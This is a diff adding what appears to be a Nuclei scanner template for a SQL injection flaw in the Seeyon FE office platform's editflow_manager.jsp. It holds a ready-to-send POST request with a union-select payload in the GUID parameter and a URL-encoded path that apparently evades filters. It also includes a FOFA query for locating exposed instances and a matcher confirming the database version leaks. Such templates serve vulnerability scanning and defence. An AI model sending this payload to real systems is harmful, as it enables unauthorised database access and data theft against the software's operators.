@@ -1,0 +1,31 @@
+id: seeyon-fe-editflow_manager-sql
+
+info:
+  name: 致远互联FE协作办公平台 SQL注入漏洞
+  author: 3tefanie
+  severity: high
+  description: 远互联FE协作办公平台editflow_manager.jsp存在sql注入漏洞，由于GUID参数未过滤或者过滤不严格，允许攻击者利用漏洞获取数据库敏感。
+
+  metadata: 
+    fofa-query: app="致远互联-FE"
+    verified: true
+    max-request: 1
+
+http:
+  - raw:
+      - |
+        POST /sysform/003/editflow_manager.j%73p HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+
+        option=2&GUID=-1%27+union+select+@@version--+
+
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==200 && contains(body,"Microsoft SQL Server")
